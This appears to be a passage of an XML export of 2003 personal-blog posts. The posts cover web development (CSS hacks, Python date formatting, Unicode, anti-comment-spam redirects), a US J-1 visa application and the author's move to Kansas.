		<field name="body">&lt;p&gt;Tantek has created/discovered a new &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; hack, the &lt;a href=&quot;http://tantek.com/CSS/Examples/midpass.html&quot;&gt;Mid Pass Filter&lt;/a&gt;. This filter allows you to write &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; rules that will only be applied by &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 5 and &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 5.5 for Windows. This is great news, as those are the browsers with the &lt;a href=&quot;http://simon.incutio.com/archive/2003/05/26/theBoxModel&quot; title=&quot;Understanding the Box Model&quot;&gt;broken box model&lt;/a&gt; (provided you trigger standards mode in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 6).&lt;/p&gt;

&lt;p&gt;As with almost all hacks it looks pretty revolting. My recommendation is to accompany all hacks like this used in live stylesheets with a commented link to the page describing the technique.&lt;/p&gt;</field>
		<field name="created">2003-10-06 23:35:04</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1213</field>
		<field name="title">Opening times for online forums?</field>
		<field name="slug">mySecretIsOut</field>
		<field name="body">&lt;p&gt;Here's something I've never seen before. The BBC's &lt;a href=&quot;http://www.bbc.co.uk/cgi-perl/h2/h2.cgi?board=talksoap.neighbours&amp;amp;state=threads&quot;&gt;Neighbours messageboard&lt;/a&gt; currently has a note up saying &quot;This messageboard is currently closed&quot;, with a link to the opening times: 9am until 10pm weekdays, opening 10am at weekends. You can still read the forums but you can't post anything. This is obviously a moderation tactic to ensure there is always an administrator available to delete offensive material should any be posted - I'm writing about it here because I've never seen this approach used before.&lt;/p&gt;

&lt;p&gt;You may well ask what I'm doing on the Neighbours messageboard in the first place. Let's just call it a guilty addiction - the temptation of 25 minutes of brain-dead telly at lunch time just proves too much. I check out the message boards because they have a great tradition of posting &lt;a href=&quot;http://www.bbc.co.uk/cgi-perl/h2/h2.cgi?thread=%3C1065446875-16491.14%40forum0.thdo.bbc.co.uk%3E&amp;amp;find=%3C1065446875-16491.14%40forum0.thdo.bbc.co.uk%3E&amp;amp;board=talksoap.neighbours&amp;amp;sort=Te&quot; title=&quot;The mother of all ugly URLs&quot;&gt;acerbic reviews&lt;/a&gt; of each day's episode, which are far more entertaining than the actual show.&lt;/p&gt;</field>
		<field name="created">2003-10-07 00:31:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1214</field>
		<field name="title">How I obtained my US Visa</field>
		<field name="slug">myVisa</field>
		<field name="body">&lt;p&gt;I received my J-1 Visa for 11 months in the US this morning, accompanied by my certificate of eligibility for J-1 status. I promptly cut the certificate in half with a pair of scissors while opening the envelope, but a call to the Embassy has confirmed that it's still valid and will still get me in to the country.&lt;/p&gt;

&lt;p&gt;I'm going to describe the application process I followed here, because the information on the official site can be a bit confusing. These tips apply to University students who are UK citizens and wish to take a (paid) industrial placement in the United States as part of their degree course. This is what I had to do; your circumstances may differ, and no garauntees are made as to the accuracy of this information. This information is likely to be of very limited interest to anyone &lt;em&gt;not&lt;/em&gt; planning to take an industrial placement in the USA.&lt;/p&gt;

&lt;p&gt;I applied for a &lt;a href=&quot;http://www.usembassy.org.uk/cons_web/visa/niv/exchange.htm&quot;&gt;J-1 academic visa&lt;/a&gt;, which is a Nonimmigrant visa specifically designed for educational visitors. Nonimmigrant means you aren't planning to move to the States permanently. In order to qualify for a J-1 visa you need to by a member of &lt;q cite=&quot;http://www.usembassy.org.uk/cons_web/visa/niv/exchange.htm&quot;&gt;an officially approved program sponsored by an educational or other nonprofit institution&lt;/q&gt;. I went with &lt;a href=&quot;http://www.aipt.org/&quot; title=&quot;Association for International Practical Training&quot;&gt;AIPT&lt;/a&gt;. The first part of the application process involved the company I am training with contacting &lt;acronym title=&quot;Association for International Practical Training&quot;&gt;AIPT&lt;/acronym&gt;, followed by a whole bunch of forms and a registration fee.&lt;/p&gt;

&lt;p&gt;We paid an express processing fee and waited only a few weeks, but without the fee it could have taken longer. &lt;acronym title=&quot;Association for International Practical Training&quot;&gt;AIPT&lt;/acronym&gt; then sent me the key to my visa application, a DS-2019 form entitled &quot;Certificate of eligibility for Exchange Visitor (J-1) Status&quot;. This was one of three forms which I had to present at the US Embassy in London.&lt;/p&gt;

&lt;p&gt;The single most important thing to know is this: &lt;strong&gt;You cannot turn up at the Embassy without an appointment!&lt;/strong&gt; I nearly missed this detail and went down to London without one, which would have been a wasted trip. You make an appointment by calling the &lt;a href=&quot;http://www.usembassy.org.uk/cons_web/visa/contact.htm#phone&quot;&gt;Embassy's live operator service&lt;/a&gt;, currently on 09055-444-546 and charged at £1.30/minute. As far as I know there is no other way of booking an appointment.&lt;/p&gt;

&lt;p&gt;My appointment was set for 9am on a Friday morning, approximately 3 weeks after I made the call. A few days after making the call I received an envelope in the mail with full instructions on what I needed to bring to the Embassy. This included the DS-2019 form mentioned previously, plus forms DS-156, DS-157 and DS-158 (all of which were included in the envelope; they can also be &lt;a href=&quot;http://travel.state.gov/visaforms.html&quot;&gt;filled out and printed online&lt;/a&gt;). I also needed a valid UK passport, a 2 inch square colour photograph, a self addressed Royal Mail special delivery envelope, proof that I had paid the visa application fee and documents to support the fact that I wasn't planning to move to the US permanently as an illegal immigrant. I used a letter from my University confirming I would be entering the final year of my degree in 2004. The letter also mentioned that I needed &quot;confirmation that your admission has been entered into the SEVIS database&quot; but as far as I can tell this was covered by the DS-2019 form sent by &lt;acronym title=&quot;Association for International Practical Training&quot;&gt;AIPT&lt;/acronym&gt;.&lt;/p&gt;

&lt;p&gt;The forms turned out to be the easy part; the hard part was obtaining the photo, payment proof and special delivery envelope. The envelope I bought from a post office or around £7. The photo I got from a specialist photographer on Oxford Street (Passport Photo Service) for £6 - as far as I can tell the American 2 inch format is not available from passport photo machines. Additional details on the photograph as well as suggested suppliers are available &lt;a href=&quot;http://www.usembassy.org.uk/cons_web/acs/passports/photo.htm&quot; title=&quot;Photographs&quot;&gt;on the Embassy website&lt;/a&gt;. Again, this information was included in the information sent by the Embassy. Finally, the proof of payment involved taking a form sent by the Embassy to a branch of Barclay's bank (HSBC didn't know how to process it) and paying the bank clerk a £67 fee.&lt;/p&gt;

&lt;p&gt;My appointment was at 9.30am. I arrived at 9.10am (the closest tube station is Bond Street; do &lt;em&gt;not&lt;/em&gt; go to Hyde Park corner as it's a longer walk than you might think) and joined a &lt;em&gt;huge&lt;/em&gt; queue of people waiting to get through security. I made it in to the Embassy just after 10am; luckily it seems that the security queues mean most people miss their appointment time and it's not a problem if you do, but I still recommend arriving earlier than I did. Once inside, there was another queue to hand my documents over at a window. Then I sat down and waited for them to call my number. Once called, I was interviewed briefly at another window about what I would be doing in the States and a few personal details, then told that my visa had been approved and would be mailed to me in 7 to 10 working days. And that was it.&lt;/p&gt;

&lt;p&gt;A final piece of advice: special delivery envelopes are tricky things. Open carefully and hopefully you won't make the same mistake I did!&lt;/p&gt;

&lt;p&gt;Repeated disclaimer for people coming in via a search engine: I am not a visa expert. This article describes the process I went through to get my J-1 academic visa in the hope that it will be useful to someone else trying to obtain the same thing, but for any visa application you need to do your homework, read your way around the &lt;a href=&quot;http://www.usembassy.org.uk/cons_web/visa/visaindex.htm&quot; title=&quot;Visa Services&quot;&gt;official site&lt;/a&gt; and double check &lt;em&gt;everything&lt;/em&gt;. Oh, and allow at least several months for the overall process.&lt;/p&gt;</field>
		<field name="created">2003-10-07 10:48:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1215</field>
		<field name="title">PHP's date() function in Python</field>
		<field name="slug">dateInPython</field>
		<field name="body">&lt;p&gt;In switching from &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; to Python I'm discovering an increasing number of &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; functions that I've learnt to rely on but have no direct equivalent in the Python standard library. Often Python simply provides a different way of approaching the problem, but old habits die hard and I've been replicating some of &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;'s functionality in Python for my own personal use.&lt;/p&gt;

&lt;p&gt;Python 2.3 introduced the datetime module, which has comprehensive support for performing calculations on dates. Users of earlier Python versions can still benefit from the module thanks to a pure Python implementation &lt;a href=&quot;http://cvs.sourceforge.net/viewcvs.py/python/python/nondist/sandbox/datetime/&quot; title=&quot;python/python/nondist/sandbox/datetime&quot;&gt;available here&lt;/a&gt;. datetime objects can be formatted as strings using the strftime method, &lt;a href=&quot;http://www.python.org/doc/current/lib/module-time.html#l2h-1764&quot; title=&quot;6.10 time: strftime()&quot;&gt;documented here&lt;/a&gt;; &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; offers a &lt;a href=&quot;http://www.php.net/strftime&quot;&gt;similar function&lt;/a&gt;. strftime() is a powerful function which takes full account of the current locale when formatting dates. &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;'s &lt;a href=&quot;http://www.php.net/date&quot;&gt;date()&lt;/a&gt; function ignores the locale but provides a far richer set of formatting options, including my favourite: the ability to display a date with an ordinal, for example &quot;7th October&quot;.&lt;/p&gt;

&lt;p&gt;I've always preferred date(), so I've ported it to to Python. &lt;a href=&quot;http://simon.incutio.com/code/python/DateFormat.py&quot; title=&quot;DateFormat.py&quot;&gt;My version&lt;/a&gt; supports most of &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;'s &lt;a href=&quot;http://www.php.net/date&quot;&gt;date format options&lt;/a&gt;, raising a NotImplemented exception for any that are unsupported. Usage looks like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;gt;&amp;gt;&amp;gt; import datetime
&amp;gt;&amp;gt;&amp;gt; from DateFormat import DateFormat
&amp;gt;&amp;gt;&amp;gt; d = datetime.datetime.now()
&amp;gt;&amp;gt;&amp;gt; df = DateFormat(d)
&amp;gt;&amp;gt;&amp;gt; print df.format('jS F Y H:i')
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The class works using a neat piece of introspection. Each of the available formatting options is implemented as a method of the class which returns that part of the date formatted in the correct way. For example, the 'a' command (for returning 'am' or 'pm' in lower case) looks like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;    def a(self):
        '&quot;am&quot; or &quot;pm&quot;'
        if self.date.hour &amp;gt; 12:
            return 'pm'
        else:
            return 'am'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The format method simply cycles through the characters in the format string, attempting to call the method of that name each time round using getattr(). If a method doesn't exist (i.e the character isn't one of the special formatting commands) a try/except block catches the thrown AttributeError. The whole method looks like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;    def format(self, formatstr):
        result = ''
        for char in formatstr:
            try:
                result += str(getattr(self, char)())
            except AttributeError:
                result += char
        return result
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I might alter the interface a bit in the future, maybe creating an extended version of the datetime class itself, but for the moment this serves my purposes just fine.&lt;/p&gt;</field>
		<field name="created">2003-10-07 11:35:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1216</field>
		<field name="title">There goes the neighbourhood</field>
		<field name="slug">bushblog</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.georgewbush.com/blog/&quot; title=&quot;GeorgeWBush.com: Official Blog&quot;&gt;Blogs just stopped being cool&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-10-07 14:32:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1217</field>
		<field name="title">Unstructured linkage</field>
		<field name="slug">unstructured</field>
		<field name="body">&lt;ul&gt;
 &lt;li&gt;Tom Gilder: &lt;a href=&quot;http://blog.tom.me.uk/2003/10/07/absolutely_fucking_nuts.php&quot;&gt;Absolutely fucking nuts&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://whatdoiknow.org/archives/001254.shtml&quot;&gt;Get ready for IE changes&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://wolfram.org/writing/howto/3.html&quot;&gt;Score Higher in Google Search Engine (and why Google is saving the web)&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.myelin.co.nz/post/2003/10/7/#200310072&quot;&gt;High performance XML-RPC&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://lcamtuf.coredump.cx/juggling_with_packets.txt&quot;&gt;Juggling with packets: floating data storage&lt;/a&gt; (via &lt;a href=&quot;http://www.nedbatchelder.com/blog/200310.html#e20031007T063004&quot; title=&quot;Juggling with packets&quot;&gt;Ned&lt;/a&gt;)&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.xml.com/pub/a/2003/10/01/deviant.html&quot;&gt;Taking the Pulse of XML Editing&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.javaworld.com/javaworld/jw-10-2003/jw-1003-generics.html?&quot;&gt;Beware the dangers of generic Exceptions&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://a.wholelottanothing.org/features.blah/entry/007472&quot;&gt;Blogging for Dollars&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.agcs.com/supportv2/techpapers/patterns/papers/respat.htm&quot;&gt;Resign Patterns: Ailments of Unsuitable Project-Disoriented Software&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.patchdayreview.com/&quot;&gt;PatchDayReview.com&lt;/a&gt; - Explaining Microsoft's Weekly Patches in Non-Technical Terms&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://xao-php.sourceforge.net/&quot;&gt;XML Application Objects&lt;/a&gt; (via the &lt;a href=&quot;http://www.sitepointforums.com/showthread.php?postid=953326&quot; title=&quot;NEW: XML Application Objects&quot;&gt;SitePoint Forums&lt;/a&gt;)&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.ibiblio.org/xml/books/bible2/chapters/ch17.html&quot;&gt;Chapter 17 of the  XML Bible: XSL Transformations&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.eastbayexpress.com/issues/2003-09-17/music.html/1/index.html&quot;&gt;Radiohead, as drawn by 5th graders&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.tpsonline.org.uk/&quot;&gt;Telephone Preference Service&lt;/a&gt;, the UK Do Not Call list&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2003-10-07 16:09:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1218</field>
		<field name="title">Yahoo News Search RSS feeds</field>
		<field name="slug">yahooNewsRSS</field>
		<field name="body">&lt;p&gt;It's not a new idea (&lt;a href=&quot;http://www.feedster.com/&quot;&gt;Feedster&lt;/a&gt; has been doing it for a while) but it's a first for a major search engine: Yahoo are &lt;a href=&quot;http://jeremy.zawodny.com/blog/archives/001001.html&quot; title=&quot;Yahoo! News Search via RSS&quot;&gt;now offering&lt;/a&gt; &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; feeds of the results of searches within Yahoo news. The feeds are advertisement free, probably because you have to click through to the news stories to read them in full. I wonder how long it will be before someone starts offering custom feeds like this with advertising in the feed itself? As &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; is an &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; format parsing out adverts before they get to the user is a much more obviosu step than ad-blockers in web browsers.&lt;/p&gt;</field>
		<field name="created">2003-10-08 00:29:46</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1219</field>
		<field name="title">Python snippet: ordinalth(n)</field>
		<field name="slug">externalMemory</field>
		<field name="body">&lt;p&gt;Blogged so I don't lose it (blogging as external memory):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;def ordinalth(n):
    &quot;&quot;&quot; 1 =&amp;gt; 1st, 2 =&amp;gt; 2nd etc &quot;&quot;&quot;
    last = n - n / 10 * 10
    if last == 1:
        return '%dst' % n
    if last == 2:
        return '%dnd' % n
    if last == 3:
        return '%drd' % n
    return '%dth' % n
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; See comments for improved version.&lt;/p&gt;</field>
		<field name="created">2003-10-08 15:03:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1220</field>
		<field name="title">&quot;Getting&quot; Python</field>
		<field name="slug">gettingPython</field>
		<field name="body">&lt;p&gt;David Brown: &lt;a href=&quot;http://radio.weblogs.com/0100039/2003/10/07.html#a404&quot;&gt;Python is a time bomb (in a good way)&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://radio.weblogs.com/0100039/2003/10/07.html#a404&quot;&gt;
&lt;p&gt;Python is a time bomb. I've yet to see someone run with it the first time they are exposed to it. We all know the drill. &quot;Indenting for block structure?&quot; &quot;Why should I use Python when I can do all that in Perl?&quot; and the ever popular &quot;Scripting languages are not for serious programs.&quot;&lt;/p&gt;

&lt;p&gt;But then, because you're curious, you start using it. The first thing you notice is that (if you had good formatting habits to begin with) the indenting issue goes away. You were going to do it that way anyway, right? Then you notice that you got the job done in less time than you realized it would take. Personally, that's my favorite bit. The &quot;It's done already? And it works?&quot; feeling. I love it.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I've had that &quot;It's done already?&quot; several times over the past few days. It's actually quite disconcerting - you flesh out a code idea, run it... and it works. And it's finished. And it's generally in good enough shape to be used as-is. I think part of the reason is that I constantly have the interactive prompt open to try out code snippets, so most of the syntax errors and misunderstandings about how a language feature work have been dealt with before I even commit a line of code to my text editor.&lt;/p&gt;</field>
		<field name="created">2003-10-08 15:39:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1221</field>
		<field name="title">Firebird URL shortcut tips</field>
		<field name="slug">firebirdShortcuts</field>
		<field name="body">&lt;p&gt;I've been using these for ages, but in case you haven't heard about them here are some handy shortcuts involving Firebird's &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt; bar:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;Enter a word (or several words) and hit &lt;kbd&gt;Enter&lt;/kbd&gt;; Firebird runs a Google &quot;I'm feeling lucky&quot; search thus redirecting you to the top result. Great for sites you can't remember the &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt; for, such as &lt;a href=&quot;http://www.google.com/search?q=thunderbird+help&amp;amp;btnI=1&quot;&gt;&quot;Thunderbird Help&quot;&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;Enter a word and hit &lt;kbd&gt;Ctrl&lt;/kbd&gt;+&lt;kbd&gt;Enter&lt;/kbd&gt;; Firebird adds www. to the start and .com to the end and takes you to that site.&lt;/li&gt;
 &lt;li&gt;Enter a word and hit &lt;kbd&gt;Shift&lt;/kbd&gt;+&lt;kbd&gt;Enter&lt;/kbd&gt;; Firebird takes you to the .net domain.&lt;/li&gt; 
 &lt;li&gt;Enter a word and hit &lt;kbd&gt;Ctrl&lt;/kbd&gt;+&lt;kbd&gt;Shift&lt;/kbd&gt;+&lt;kbd&gt;Enter&lt;/kbd&gt;; Firebird takes you to the .org domain.&lt;/li&gt;
 &lt;li&gt;Also, hitting &lt;kbd&gt;Alt&lt;/kbd&gt;+&lt;kbd&gt;Enter&lt;/kbd&gt; (or &lt;kbd&gt;Alt&lt;/kbd&gt;+any of the above) opens a new tab with that &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt; in it.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Finally, &lt;kbd&gt;Ctrl&lt;/kbd&gt;+&lt;kbd&gt;K&lt;/kbd&gt; focuses you on the quick search box at the top, and &lt;kbd&gt;F6&lt;/kbd&gt; or &lt;kbd&gt;Alt&lt;/kbd&gt;+&lt;kbd&gt;D&lt;/kbd&gt; jump you to the &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt; bar itself.&lt;/p&gt;

&lt;p&gt;Check out Firebird Help for the definitive list of &lt;a href=&quot;http://texturizer.net/firebird/keyboard.html&quot;&gt;keyboard shortcuts&lt;/a&gt; and &lt;a href=&quot;http://texturizer.net/firebird/mouse.html&quot;&gt;mouse shortcuts&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-10-10 14:51:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1222</field>
		<field name="title">New anti-comment-spam measure</field>
		<field name="slug">linkRedirects</field>
		<field name="body">&lt;p&gt;I've added a new anti-comment-spam measure to this site. The majority of comment spam exists for one reason and one reason only to increase the Google PageRank of the site linked from the spam and specifically to increase its ranking for the term used in the link. This is why so many comment spams include links like this: &lt;a href=&quot;http://jeremy.zawodny.com/blog/archives/001002.html&quot;&gt;Cheap Viagra&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Cut off the PageRank boost and you cut off the advantage of spamming, simple as that. I've altered my comments system to redirect ALL outgoing links through a simple redirect script, and added that script to &lt;a href=&quot;/robots.txt&quot;&gt;my robots.txt file&lt;/a&gt;. Links still work fine (even the referral information persists across the redirect) but Google will ignore them completely when calculating PageRank.&lt;/p&gt;

&lt;p&gt;Will this reduce the floods of comment spam my site receives? Probably not; I've added a note about the restriction to my 'add comment' form but I doubt many spammers bother to read much about the sites they are targetting. What's really needed is for this technique to become widespread by being integrated in to existing blogging tools - are you listening Moveable Type hackers?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; Sencer has &lt;a href=&quot;http://www.sencer.de/index.php?p=81&quot; title=&quot;Google Comment Spammers, Redirects and PR&quot;&gt;pointed out&lt;/a&gt; in the comments that PageRank persists over redirects, and Google appears to ignore robots.txt when used to hide a redirecting page. I've updated my redirection script to use javascript to power the redirect (with a link for people with javascript disabled) and an extra meta tag to remind Google not to follow the link. This has the unfortunate side effect that referral information no longer persists across the redirect.&lt;/p&gt;</field>
		<field name="created">2003-10-13 08:22:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1223</field>
		<field name="title">Practical Unicode, please!</field>
		<field name="slug">practicalUnicode</field>
		<field name="body">&lt;p&gt;Joel Spolsky has joined &lt;a href=&quot;http://www.tbray.org/ongoing/What/Technology/Coding/Text/&quot; title=&quot;Ongoing : Technology : Coding : Text&quot;&gt;Tim Bray&lt;/a&gt; in the quest to &lt;a href=&quot;http://www.joelonsoftware.com/articles/Unicode.html&quot; title=&quot;The Absolute Minimum Every Software Developer Absolutely, Positively Must Know About Unicode and Character Sets (No Excuses!)&quot;&gt;educate the masses&lt;/a&gt; as to the importance of Unicode. Dan Sugalski kicks in as well with &lt;a href=&quot;http://www.sidhe.org/~dan/blog/archives/000255.html&quot;&gt;What the heck is: A string&lt;/a&gt;, a lengthy essay about string handling and why it really is a lot more complicated than you think it is.&lt;/p&gt;

&lt;p&gt;These should all be required reading for anyone involved in programming and web development. Unfortunately, they all lack one critical aspect: practical advice. Having read all three I feel like I could lecture for an hour on code points, glyphs, ASCII, byte-order and a whole bunch of other topics. When it comes to updating my blogging system to support comments written in Japanese I'm still almost as clueless as I was before I read any of the above.&lt;/p&gt;

&lt;p&gt;Enough of the theory: the web needs practical advice on developing Unicode enabled web pages and web applications. Is it just a case of ensuring my text editor is &quot;saving as Unicode&quot;? What about storage - can I throw Unicode at MySQL and expect it to come out again? If I serve a page up with Japanese characters in it, what will my users have to do to be able to read them? It's a big, confusing world out there.&lt;/p&gt;</field>
		<field name="created">2003-10-13 12:23:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1224</field>
		<field name="title">Learning to use Floats</field>
		<field name="slug">learningFloats</field>
		<field name="body">&lt;p&gt;Russ Weakley's latest offering, &lt;a href=&quot;http://css.maxdesign.com.au/floatutorial/&quot;&gt;Floatutorial&lt;/a&gt;, is probably the single most valuable &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; tutorial I've seen to date. Floats are one of the most powerful constructs offered by &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;, but they are also the hardest to master. Floatutorial provides a &lt;a href=&quot;http://css.maxdesign.com.au/floatutorial/introduction.htm&quot; title=&quot;Float basics&quot;&gt;clear introduction&lt;/a&gt; to the theory behind floats, then dives straight in with a series of 9 tutorials that take you from &lt;a href=&quot;http://css.maxdesign.com.au/floatutorial/tutorial0101.htm&quot; title=&quot;Tutorial 1. Floating an image to the right&quot;&gt;using simple floats to align images&lt;/a&gt; right up to &lt;a href=&quot;http://css.maxdesign.com.au/floatutorial/tutorial0901.htm&quot; title=&quot;Tutorial 9. Liquid three column layout&quot;&gt;building a liquid 3 column layout&lt;/a&gt; using floated divs. If you haven't yet mastered floats you owe it to yourself to read this tutorial; if you feel you have mastered them its worth looking through to pick up some ideas. The more tutorials like this the better.&lt;/p&gt;

&lt;p&gt;I'm going offline for a couple of days. The next time I post I'll be in Kansas, for the start of my 11 month placement at the &lt;a href=&quot;http://www.ljworld.com/&quot;&gt;Journal-World&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-10-14 12:04:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1225</field>
		<field name="title">Kansas Blog</field>
		<field name="slug">kansasBlog</field>
		<field name="body">&lt;p&gt;I've set up a new blog, &lt;a href=&quot;http://www.a-year-in-kansas.com/&quot;&gt;A Year in Kansas&lt;/a&gt;, to chronicle my adventures during my 11 months in the States. I'm going to keep my two blogs pretty much separate; my Kansas blog is going to be squarely targetted at friends and family who want to know how I'm getting on, while this blog will remain focused on my geekier interests.&lt;/p&gt;

&lt;p&gt;I've only written &lt;a href=&quot;http://www.a-year-in-kansas.com/archive/2003/10/17/arrival&quot; title=&quot;Arrival&quot;&gt;one entry&lt;/a&gt; for it, but it's already clear that writing a personal blog and writing a technical blog involve very different styles. It'll probably take me a while to get settled in over there.&lt;/p&gt;

&lt;p&gt;Incidentally, the new blog is running a bare bones implementation of my re-engineered blogging system, which is developed along the lines of &quot;the simplest thing that could possible work&quot;. I'll be adding new features such as comments as and when time permits. That's if I don't decide to start from scratch in Python of course ;)&lt;/p&gt;</field>
		<field name="created">2003-10-18 00:25:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1226</field>
		<field name="title">CSS border art and other treats</field>
		<field name="slug">borderArt</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.designdetector.com/&quot; title=&quot;Design Detector&quot;&gt;Chris Hester&lt;/a&gt;'s &lt;a href=&quot;http://www.designdetector.com/tips/3DBorderDemo2.html&quot;&gt;3D Border Demo 2&lt;/a&gt; (via &lt;a href=&quot;http://web-graphics.com/mtarchive/001042.php&quot; title=&quot;A house made entirely of CSS?&quot;&gt;Web Graphics&lt;/a&gt;) is an impressive demo of just how much you can achieve with CSS borders. His &lt;a href=&quot;http://www.designdetector.com/tips/tips.php&quot;&gt;Tips &amp;amp; Demos collection&lt;/a&gt; is worth browsing through as well; I particularly liked this &lt;a href=&quot;http://www.designdetector.com/tips/shadow.html&quot;&gt;Shadow Demo&lt;/a&gt;, although markup purists may be distressed by the number of nested divs. The sooner we can use the &lt;a href=&quot;http://blog.tom.me.uk/2003/07/14/looking_ahead_to_css3_part_1_the_outside_pseudoelement.php&quot; title=&quot;Looking ahead to CSS3, Part 1: The ::outside pseudo-element&quot;&gt;CSS3 ::outside pseudo element&lt;/a&gt; to achieve effects like this without the surplus divs the better.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; On closer inspection the additional divs aren't nested within each other; they are individually positioned to achieve the desired effect.&lt;/p&gt;</field>
		<field name="created">2003-10-18 19:31:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1227</field>
		<field name="title">The Python Web SIG</field>
		<field name="slug">pythonWebSIG</field>
		<field name="body">&lt;p&gt;Python now has a &lt;a href=&quot;http://www.python.org/sigs/web-sig/&quot;&gt;Web SIG&lt;/a&gt;. &lt;acronym title=&quot;Special Interest Group&quot;&gt;SIG&lt;/acronym&gt;s are Special Interest Groups, each with a target to develop and improve a certain aspect of the Python language, standard library or community. The Web &lt;acronym title=&quot;Special Interest Group&quot;&gt;SIG&lt;/acronym&gt; has two purposes: create a plan for improving Python's web client abilities (including things like the ability to parse &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;) and work on improving Python's server side capabilities.&lt;/p&gt;

